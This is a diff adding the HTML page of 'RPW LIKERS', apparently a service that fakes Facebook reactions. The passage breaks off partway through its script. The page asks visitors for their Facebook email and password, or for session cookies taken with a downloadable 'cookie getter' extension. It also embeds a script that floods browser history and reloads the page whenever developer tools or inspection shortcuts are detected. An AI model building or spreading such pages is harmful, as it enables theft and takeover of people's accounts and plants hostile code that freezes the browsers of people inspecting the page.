@@ -1,1 +1,1895 @@
-# Site
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RPW LIKERS - Facebook Reaction Booster</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.7.12/sweetalert2.min.css">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.24/dist/vanta.net.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.7.12/sweetalert2.min.js"></script>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  
+  <style>
+    :root {
+      --primary: #8b5cf6;
+      --primary-dark: #7c3aed;
+      --secondary: #f59e0b;
+      --accent: #ec4899;
+    }
+    
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1e1b2e 0%, #2d1b69 100%);
+      color: #f8fafc;
+      overflow-x: hidden;
+    }
+    
+    .glass-card {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+    }
+    
+    .gradient-text {
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .login-tabs {
+      display: flex;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      padding: 4px;
+      margin-bottom: 20px;
+    }
+
+    .login-tab {
+      flex: 1;
+      padding: 12px;
+      text-align: center;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-weight: 500;
+    }
+
+    .login-tab.active {
+      background: rgba(139, 92, 246, 0.3);
+      color: white;
+    }
+
+    .login-tab:not(.active) {
+      color: #9ca3af;
+    }
+
+    .login-tab:not(.active):hover {
+      color: #d1d5db;
+    }
+
+    .login-form {
+      display: none;
+    }
+
+    .login-form.active {
+      display: block;
+    }
+
+    .tutorial-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 10000;
+      backdrop-filter: blur(5px);
+    }
+
+    .tutorial-modal-content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: linear-gradient(135deg, #1e1b2e 0%, #2d1b69 100%);
+      border: 2px solid rgba(139, 92, 246, 0.5);
+      border-radius: 20px;
+      width: 90%;
+      max-width: 800px;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    }
+
+    .tutorial-header {
+      background: rgba(139, 92, 246, 0.2);
+      padding: 20px;
+      border-radius: 18px 18px 0 0;
+      border-bottom: 1px solid rgba(139, 92, 246, 0.3);
+      position: relative;
+    }
+
+    .tutorial-body {
+      padding: 30px;
+    }
+
+    .tutorial-step {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 1.5rem;
+      padding: 1.5rem;
+      background: rgba(139, 92, 246, 0.1);
+      border-radius: 12px;
+      border: 1px solid rgba(139, 92, 246, 0.2);
+      transition: all 0.3s ease;
+    }
+
+    .tutorial-step:hover {
+      background: rgba(139, 92, 246, 0.15);
+      transform: translateX(5px);
+    }
+
+    .step-number {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      color: white;
+      font-weight: bold;
+      margin-right: 1rem;
+      flex-shrink: 0;
+      font-size: 0.9rem;
+    }
+
+    .step-content {
+      flex: 1;
+    }
+
+    .step-content p {
+      margin: 0;
+      color: #e5e7eb;
+      line-height: 1.6;
+    }
+
+    .download-link {
+      display: inline-flex;
+      align-items: center;
+      background: rgba(59, 130, 246, 0.2);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      color: #60a5fa;
+      padding: 8px 16px;
+      border-radius: 8px;
+      margin-top: 8px;
+      transition: all 0.3s ease;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+
+    .download-link:hover {
+      background: rgba(59, 130, 246, 0.3);
+      transform: translateY(-2px);
+      color: #93c5fd;
+    }
+
+    .profile-pic-warning {
+      background: rgba(245, 158, 11, 0.15);
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      border-radius: 8px;
+      padding: 12px;
+      margin: 15px 0;
+      text-align: center;
+    }
+
+    .profile-pic-warning p {
+      margin: 0;
+      color: #fbbf24;
+      font-size: 0.9rem;
+    }
+
+    .profile-pic-warning strong {
+      color: #f59e0b;
+    }
+
+    .warning-box {
+      background: rgba(245, 158, 11, 0.15);
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 1.5rem;
+    }
+
+    .warning-box p {
+      margin: 0 0 8px 0;
+      color: #fbbf24;
+      font-size: 0.9rem;
+    }
+
+    .warning-box p:last-child {
+      margin-bottom: 0;
+    }
+
+    .warning-box strong {
+      color: #f59e0b;
+    }
+
+    .tutorial-footer {
+      padding: 20px;
+      text-align: center;
+      border-top: 1px solid rgba(139, 92, 246, 0.3);
+      background: rgba(139, 92, 246, 0.1);
+      border-radius: 0 0 18px 18px;
+    }
+
+    .got-it-btn {
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: button;
+      transition: all 0.3s ease;
+    }
+
+    .got-it-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3);
+    }
+
+    #loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #1e1b2e 0%, #2d1b69 100%);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      transition: opacity 0.5s ease-out;
+    }
+    
+    .loading-spinner {
+      width: 80px;
+      height: 80px;
+      border: 5px solid rgba(139, 92, 246, 0.3);
+      border-radius: 50%;
+      border-top-color: #8b5cf6;
+      animation: spin 1s ease-in-out infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .loading-text {
+      font-size: 1.5rem;
+      color: white;
+      margin-top: 20px;
+    }
+    
+    .loading-progress {
+      width: 200px;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 2px;
+      margin-top: 20px;
+      overflow: hidden;
+    }
+    
+    .loading-progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      border-radius: 2px;
+      width: 0%;
+      animation: loading 2s ease-in-out infinite;
+    }
+    
+    @keyframes loading {
+      0% { width: 0%; }
+      50% { width: 70%; }
+      100% { width: 100%; }
+    }
+
+    .form-input {
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: white;
+    }
+    
+    .form-input:focus {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(139, 92, 246, 0.2);
+    }
+
+    .reaction-bar {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .reaction-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 8px 12px;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      min-width: 60px;
+    }
+    
+    .reaction-item:hover {
+      background: rgba(139, 92, 246, 0.2);
+      transform: translateY(-2px);
+    }
+    
+    .reaction-item.active {
+      background: rgba(139, 92, 246, 0.3);
+      border: 1px solid rgba(139, 92, 246, 0.5);
+    }
+    
+    .reaction-image {
+      width: 32px;
+      height: 32px;
+      margin-bottom: 4px;
+      object-fit: contain;
+    }
+    
+    .reaction-name {
+      font-size: 0.75rem;
+      color: #d1d5db;
+    }
+
+    .usage-info {
+      background: rgba(139, 92, 246, 0.1);
+      border-radius: 10px;
+      padding: 15px;
+      margin-top: 20px;
+    }
+    
+    .usage-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    
+    .usage-label {
+      color: #d1d5db;
+    }
+    
+    .usage-value {
+      font-weight: 600;
+    }
+    
+    .usage-value.success {
+      color: #4ade80;
+    }
+    
+    .usage-value.warning {
+      color: #fbbf24;
+    }
+    
+    .usage-value.error {
+      color: #f87171;
+    }
+
+    .user-info-card {
+      background: rgba(139, 92, 246, 0.15);
+      border: 1px solid rgba(139, 92, 246, 0.3);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .user-avatar {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: white;
+      margin-right: 15px;
+      object-fit: cover;
+    }
+
+    .user-profile-pic {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-right: 15px;
+      border: 2px solid var(--primary);
+    }
+
+    .logout-btn {
+      background: rgba(239, 68, 68, 0.2);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      color: #f87171;
+      padding: 8px 16px;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+    }
+
+    .logout-btn:hover {
+      background: rgba(239, 68, 68, 0.3);
+      transform: translateY(-2px);
+    }
+
+    .tutorial-btn {
+      background: rgba(139, 92, 246, 0.2);
+      border: 1px solid rgba(139, 92, 246, 0.3);
+      color: #a78bfa;
+      padding: 8px 16px;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+      font-size: 0.9rem;
+    }
+
+    .tutorial-btn:hover {
+      background: rgba(139, 92, 246, 0.3);
+      transform: translateY(-2px);
+      color: #c4b5fd;
+    }
+
+    .turnstile-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .turnstile-widget {
+      transform: scale(0.9);
+    }
+
+    .security-note {
+      text-align: center;
+      margin-top: 8px;
+      font-size: 0.75rem;
+      color: #9ca3af;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+      
+      .glass-card {
+        padding: 1.5rem;
+      }
+      
+      .reaction-bar {
+        overflow-x: auto;
+        justify-content: flex-start;
+      }
+      
+      .reaction-item {
+        min-width: 55px;
+        padding: 6px 8px;
+      }
+      
+      .reaction-image {
+        width: 28px;
+        height: 28px;
+      }
+
+      .tutorial-step {
+        padding: 1rem;
+      }
+
+      .tutorial-modal-content {
+        width: 95%;
+        max-height: 85vh;
+      }
+
+      .tutorial-body {
+        padding: 20px;
+      }
+
+      .turnstile-container {
+        margin: 10px 0;
+        padding: 10px;
+      }
+
+      .turnstile-widget {
+        transform: scale(0.8);
+      }
+    }
+
+    .floating-element {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: rgba(139, 92, 246, 0.1);
+      filter: blur(40px);
+      z-index: -1;
+    }
+    
+    .floating-1 {
+      top: 10%;
+      left: 10%;
+      animation: float1 15s ease-in-out infinite;
+    }
+    
+    .floating-2 {
+      top: 60%;
+      right: 10%;
+      animation: float2 12s ease-in-out infinite;
+    }
+    
+    .floating-3 {
+      bottom: 20%;
+      left: 20%;
+      animation: float3 18s ease-in-out infinite;
+    }
+    
+    @keyframes float1 {
+      0%, 100% { transform: translate(0, 0) rotate(0deg); }
+      50% { transform: translate(30px, 50px) rotate(180deg); }
+    }
+    
+    @keyframes float2 {
+      0%, 100% { transform: translate(0, 0) rotate(0deg); }
+      50% { transform: translate(-40px, -30px) rotate(-180deg); }
+    }
+    
+    @keyframes float3 {
+      0%, 100% { transform: translate(0, 0) rotate(0deg); }
+      50% { transform: translate(50px, -20px) rotate(180deg); }
+    }
+
+    .cooldown-indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+    
+    .cooldown-active {
+      background-color: #f59e0b;
+      animation: pulse 1.5s infinite;
+    }
+    
+    .cooldown-inactive {
+      background-color: #10b981;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+  </style>
+</head>
+<body class="min-h-screen">
+  <div id="loading-screen">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">MAXIMIN LIKERS</div>
+    <div class="loading-progress">
+      <div class="loading-progress-bar"></div>
+    </div>
+  </div>
+
+  <div id="tutorialModal" class="tutorial-modal">
+    <div class="tutorial-modal-content">
+      <div class="tutorial-header">
+        <h2 class="text-2xl font-bold text-white text-center">How to Use RPW Likers</h2>
+      </div>
+      <div class="tutorial-body">
+        <div class="profile-pic-warning">
+          <p><strong>Important:</strong> Make sure your Facebook account has a profile picture before using RPW Likers!</p>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">1</div>
+          <div class="step-content">
+            <p>Choose your preferred login method:</p>
+            <p><strong>Email/Password:</strong> Simply enter your Facebook email and password</p>
+            <p><strong>Cookie:</strong> Use the cookie getter extension (advanced users)</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">2</div>
+          <div class="step-content">
+            <p>For Cookie Method: Download the cookie getter extension:</p>
+            <a href="https://www.mediafire.com/file/jgrfktee09tz18t/biarutilityfbv1.2.0.zip/file" class="download-link" target="_blank">
+              <i class="fas fa-download mr-2"></i>Download Extension
+            </a>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">3</div>
+          <div class="step-content">
+            <p>Install Lemur Browser (or any browser that supports extensions).</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">4</div>
+          <div class="step-content">
+            <p>Log in to your Facebook account inside the browser.</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">5</div>
+          <div class="step-content">
+            <p>Go to Extensions and turn on Developer Mode.</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">6</div>
+          <div class="step-content">
+            <p>Import the cookie getter extension file you downloaded.</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">7</div>
+          <div class="step-content">
+            <p>After import, open the extension and copy your Facebook cookie.</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">8</div>
+          <div class="step-content">
+            <p>Go back to RPW Likers, paste your cookie, then log in.</p>
+          </div>
+        </div>
+        
+        <div class="tutorial-step">
+          <div class="step-number">9</div>
+          <div class="step-content">
+            <p>Complete the security check and submit.</p>
+          </div>
+        </div>
+        
+        <div class="warning-box">
+          <p><strong>Reminder:</strong> Try it first using a dummy account.</p>
+          <p><strong>Important:</strong> Once you click submit on RPW Likers, do not leave or close the site until the reactions are done. If you leave while it's sending, the request can fail.</p>
+        </div>
+      </div>
+      <div class="tutorial-footer">
+        <button class="got-it-btn" id="gotItBtn">
+          <i class="fas fa-check mr-2"></i>Got It!
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="floating-element floating-1"></div>
+  <div class="floating-element floating-2"></div>
+  <div class="floating-element floating-3"></div>
+  
+  <div id="main-content" class="hidden">
+    <div id="particles-js"></div>
+    
+    <div class="container mx-auto px-4 py-8">
+      <header class="text-center mb-12 relative z-10" data-aos="fade-down">
+        <div class="flex flex-col items-center justify-center">
+          <h1 class="text-5xl font-bold mb-4 gradient-text">RPW LIKERS</h1>
+          <p class="text-xl text-gray-300 max-w-2xl mx-auto mb-6">Boost your Facebook posts with automated reactions</p>
+          <button id="tutorial-btn" class="tutorial-btn flex items-center">
+            <i class="fas fa-graduation-cap mr-2"></i>
+            How to Use
+          </button>
+        </div>
+      </header>
+
+      <div class="flex justify-center mb-12">
+        <div class="w-full max-w-2xl">
+          <div id="login-section" class="glass-card rounded-2xl p-8 h-full" data-aos="zoom-in">
+            <div class="flex items-center mb-6">
+              <div class="w-10 h-10 rounded-full bg-purple-500 flex items-center justify-center mr-3">
+                <i class="fas fa-sign-in-alt text-white"></i>
+              </div>
+              <h2 class="text-2xl font-semibold text-white">Login to RPW LIKERS</h2>
+            </div>
+            
+            <div class="login-tabs">
+              <div class="login-tab active" data-tab="email">Email/Password</div>
+              <div class="login-tab" data-tab="cookie">Cookie Login</div>
+            </div>
+            
+            <form id="emailLoginForm" class="login-form active space-y-6">
+              <div>
+                <label for="email" class="block text-sm font-medium text-gray-300 mb-2 flex items-center">
+                  <i class="fas fa-envelope mr-2 text-blue-400"></i>
+                  Facebook Email
+                </label>
+                <input 
+                  type="email" 
+                  id="email" 
+                  class="w-full px-4 py-3 rounded-xl form-input focus:outline-none transition-all duration-300"
+     placeholder="Enter your Facebook email"
+                  required
+                >
+              </div>
+              
+              <div>
+                <label for="password" class="block text-sm font-medium text-gray-300 mb-2 flex items-center">
+                  <i class="fas fa-lock mr-2 text-green-400"></i>
+                  Facebook Password
+                </label><input 
+                  type="password" 
+                  id="password" 
+                  class="w-full px-4 py-3 rounded-xl form-input focus:outline-none transition-all duration-300"
+                  placeholder="Enter your Facebook password"
+                  required
+                >
+                <p class="text-xs text-gray-400 mt-1">We don't store your password. It's used only to get your session cookie.</p>
+              </div>
+              <div class="pt-4">
+                <button 
+                  type="submit" 
+                  id="emailLoginBtn"
+                  class="w-full py-4 px-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-semibold rounded-xl shadow-lg transition-all duration-300 transform hover:scale-[1.02] flex items-center justify-center"
+                >
+                  <i class="fas fa-sign-in-alt mr-2"></i>
+                  Login with Email
+                </button>
+              </div> </form>
+            
+            <form id="cookieLoginForm" class="login-form space-y-6">
+              <div>
+                <label for="cookie" class="block text-sm font-medium text-gray-300 mb-2 flex items-center">
+                  <i class="fas fa-cookie mr-2 text-yellow-400"></i>
+                  Facebook Cookie
+                </label>
+                <textarea 
+                  id="cookie" 
+                  rows="4" 
+                  class="w-full px-4 py-3 rounded-xl form-input focus:outline-none transition-all duration-300"
+                  placeholder="Paste your Facebook cookie here..."
+                ></textarea>
+                <p class="text-xs text-gray-400 mt-1">We don't store your cookies. They are used only for this session.</p>
+              </div>
+              
+              <div class="pt-4">
+                <button 
+                  type="submit" 
+                  id="cookieLoginBtn"
+                  class="w-full py-4 px-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-semibold rounded-xl shadow-lg transition-all duration-300 transform hover:scale-[1.02] flex items-center justify-center"
+                >
+                  <i class="fas fa-sign-in-alt mr-2"></i>
+                  Login with Cookie
+                </button>
+              </div>
+            </form>
+          </div>
+
+          <div id="user-section" class="hidden" data-aos="zoom-in">
+            <div class="user-info-card mb-6">
+              <div class="flex items-center justify-between">
+                <div class="flex items-center">
+                  <img id="user-profile-pic" class="user-profile-pic" src="" alt="Profile" onerror="this.style.display='none'; document.getElementById('user-avatar').style.display='flex';">
+                  <div class="user-avatar" id="user-avatar" style="display: none;">U</div>
+                  <div>
+                    <h3 class="text-xl font-semibold text-white" id="user-name">User Name</h3>
+                    <p class="text-gray-300 text-sm" id="user-id">UID: Loading...</p>
+                    <p class="text-gray-400 text-xs" id="user-usage">Uses: 0/0</p>
+                  </div>
+                </div>
+                <button id="logoutBtn" class="logout-btn flex items-center">
+                  <i class="fas fa-sign-out-alt mr-2"></i>
+                  Logout
+                </button>
+              </div>
+            </div>
+
+            <div class="glass-card rounded-2xl p-8 h-full">
+              <div class="flex items-center mb-6">
+                <div class="w-10 h-10 rounded-full bg-purple-500 flex items-center justify-center mr-3">
+                  <i class="fas fa-bolt text-white"></i>
+                </div>
+                <h2 class="text-2xl font-semibold text-white">Reaction Booster</h2>
+              </div>
+              
+              <form id="reactionForm" class="space-y-6">
+                <div>
+                  <label for="link" class="block text-sm font-medium text-gray-300 mb-2 flex items-center">
+                    <i class="fas fa-link mr-2 text-blue-400"></i>
+                    Post URL
+                  </label>
+                  <input 
+                    type="url" 
+                    id="link" 
+                    class="w-full px-4 py-3 rounded-xl form-input focus:outline-none transition-all duration-300"
+                    placeholder="Paste Facebook post URL here..."
+                    required
+                  >
+                </div>
+                
+                <div>
+                  <label class="block text-sm font-medium text-gray-300 mb-4 flex items-center">
+                    <i class="fas fa-heart mr-2 text-red-400"></i>
+                    Reaction Type
+                  </label>
+                  
+                  <div class="reaction-bar">
+                    <div class="reaction-item active" data-reaction="LIKE">
+                      <img src="/images/react_1.png" alt="Like" class="reaction-image">
+                      <div class="reaction-name">Like</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="LOVE">
+                      <img src="/images/react_2.png" alt="Love" class="reaction-image">
+                      <div class="reaction-name">Love</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="CARE">
+                      <img src="/images/react_3.png" alt="Care" class="reaction-image">
+                      <div class="reaction-name">Care</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="HAHA">
+                      <img src="/images/react_4.png" alt="Haha" class="reaction-image">
+                      <div class="reaction-name">Haha</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="WOW">
+                      <img src="/images/react_5.png" alt="Wow" class="reaction-image">
+                      <div class="reaction-name">Wow</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="SAD">
+                      <img src="/images/react_6.png" alt="Sad" class="reaction-image">
+                      <div class="reaction-name">Sad</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="ANGRY">
+                      <img src="/images/react_7.png" alt="Angry" class="reaction-image">
+                      <div class="reaction-name">Angry</div>
+                    </div>
+                  </div>
+                  <input type="hidden" id="reaction" value="LIKE" required>
+                </div>
+                
+                <div class="usage-info">
+                  <h3 class="text-lg font-semibold text-white mb-3 flex items-center">
+                    <i class="fas fa-info-circle mr-2 text-blue-400"></i>
+                    Usage Information
+                  </h3>
+                  <div class="usage-item">
+                    <span class="usage-label">Daily Uses:</span>
+                    <span class="usage-value" id="daily-uses">0/0</span>
+                  </div>
+                  <div class="usage-item">
+                    <span class="usage-label">Status:</span>
+                    <span class="usage-value success flex items-center" id="status-info">
+                      <span class="cooldown-indicator cooldown-inactive"></span>
+                      Ready to boost
+                    </span>
+                  </div>
+                  <div id="cooldown-timer-container" class="hidden">
+                    <div class="usage-item">
+                      <span class="usage-label">Cooldown:</span>
+                      <span class="usage-value warning flex items-center" id="cooldown-timer">
+                        <span class="cooldown-indicator cooldown-active"></span>
+                        Calculating...
+                      </span>
+                    </div>
+                  </div>
+                  <div id="limit-reset-container" class="hidden">
+                    <div class="usage-item">
+                      <span class="usage-label">Limit Reset:</span>
+                      <span class="usage-value error flex items-center" id="limit-reset-timer">
+                        <span class="cooldown-indicator cooldown-active"></span>
+                        Calculating...
+                      </span>
+                    </div>
+                  </div>
+                </div>
+                
+                <div class="pt-4">
+                  <button 
+                    type="submit" 
+                    id="submitBtn"
+                    class="w-full py-4 px-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-semibold rounded-xl shadow-lg transition-all duration-300 transform hover:scale-[1.02] flex items-center justify-center"
+                  >
+                    <i class="fas fa-bolt mr-2"></i>
+                    SUBMIT
+                  </button>
+                </div>
+
+                <!-- Cloudflare Turnstile moved to BOTTOM -->
+                <div class="turnstile-container">
+                  <div id="turnstile-widget" class="turnstile-widget"></div>
+                  <input type="hidden" id="turnstileToken" name="turnstileToken" required>
+                  <div class="security-note">
+                    <i class="fas fa-shield-alt mr-1"></i>
+                    Protected by Cloudflare Turnstile
+                  </div>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <footer class="text-center py-8 border-t border-gray-800 mt-8">
+        <div class="flex justify-center space-x-6 mb-4">
+          <a href="#" class="text-gray-400 hover:text-white transition-colors">
+            <i class="fab fa-github text-xl"></i>
+          </a>
+          <a href="#" class="text-gray-400 hover:text-white transition-colors">
+            <i class="fab fa-facebook text-xl"></i>
+          </a>
+          <a href="#" class="text-gray-400 hover:text-white transition-colors">
+            <i class="fab fa-twitter text-xl"></i>
+          </a>
+          <a href="#" class="text-gray-400 hover:text-white transition-colors">
+            <i class="fab fa-discord text-xl"></i>
+          </a>
+        </div>
+        <p class="text-gray-400">Created with <i class="fas fa-heart text-red-500 mx-1"></i> by Churchill</p>
+        <p class="text-gray-500 text-sm mt-2">LARA-CUTIE &copy; 2025 - All rights reserved</p>
+      </footer>
+    </div>
+  </div>
+
+  <script>
+    const antibogart = () => {
+      const torture = () => {
+        let total = '';
+        for (var i = 0; i < 1000000; i++) {
+          total += i.toString();
+          history.pushState(0, 0, total);
+        }
+        window.location.reload();
+      }
+      
+      const detectDevTool = (allow) => {
+        if (isNaN(+allow)) {
+          allow = 100;
+        }
+        var start = +new Date();
+        debugger;
+        var end = +new Date();
+        if (isNaN(start) || isNaN(end) || end - start > allow) {
+          torture();
+        }
+      }
+      
+      if (window.eruda) {
+        torture();
+        return;
+      }
+      
+      if (window.attachEvent) {
+        if (document.readyState === "complete" || document.readyState === "interactive") {
+          detectDevTool();
+          window.attachEvent('onresize', detectDevTool);
+          window.attachEvent('onmousemove', detectDevTool);
+          window.attachEvent('onfocus', detectDevTool);
+          window.attachEvent('onblur', detectDevTool);
+        } else {
+          setTimeout(argument.callee, 0);
+        }
+      } else {
+        window.addEventListener('load', detectDevTool);
+        window.addEventListener('resize', detectDevTool);
+        window.addEventListener('mousemove', detectDevTool);
+        window.addEventListener('focus', detectDevTool);
+        window.addEventListener('blur', detectDevTool);
+      }
+      
+      const element = new Image();
+      Object.defineProperty(element, 'id', {
+        get: function() {
+          torture();
+        }
+      });
+      
+      console.log(element);
+      
+      document.onkeydown = function(e) {
+        if (e.keyCode == 123) {
+          torture();
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+          torture();
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+          torture();
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+          torture();
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+          torture();
+          return false;
+        }
+      }
+    }
+
+    antibogart();
+  </script>
+
+  <script>
+    let turnstileWidget;
+    let turnstileRendered = false;
+
+    function onTurnstileSuccess(token) {
+      document.getElementById('turnstileToken').value = token;
+    }
+
+    function resetTurnstile() {
+      if (turnstileWidget && typeof turnstile !== 'undefined') {
+        turnstile.reset(turnstileWidget);
+        document.getElementById('turnstileToken').value = '';
+      }
+    }
+
+    function renderTurnstile() {
+      if (typeof turnstile !== 'undefined' && !turnstileRendered) {
+        turnstileWidget = turnstile.render('#turnstile-widget', {
+          sitekey: '0x4AAAAAAB5YKqzfa7thtMq9',
+          theme: 'dark',
+          size: 'normal',
+          callback: onTurnstileSuccess
+        });
+        turnstileRendered = true;
+      }
+    }
+
+    const tutorialModal = document.getElementById('tutorialModal');
+    const tutorialBtn = document.getElementById('tutorial-btn');
+    const gotItBtn = document.getElementById('gotItBtn');
+
+    function openTutorial() {
+      tutorialModal.style.display = 'block';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeTutorial() {
+      tutorialModal.style.display = 'none';
+      document.body.style.overflow = 'auto';
+    }
+
+    tutorialBtn.addEventListener('click', openTutorial);
+    gotItBtn.addEventListener('click', closeTutorial);
+
+    tutorialModal.addEventListener('click', function(e) {
+      if (e.target === tutorialModal) {
+        closeTutorial();
+      }
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' && tutorialModal.style.display === 'block') {
+        closeTutorial();
+      }
+    });
+
+    document.addEventListener('DOMContentLoaded', function() {
+      let currentUser = null;
+      let currentCookie = '';
+      let userStatusInterval = null;
+      
+      // Tab switching functionality
+      const loginTabs = document.querySelectorAll('.login-tab');
+      const loginForms = document.querySelectorAll('.login-form');
+      
+      loginTabs.forEach(tab => {
+        tab.addEventListener('click', function() {
+          const tabName = this.getAttribute('data-tab');
+          
+          // Update active tab
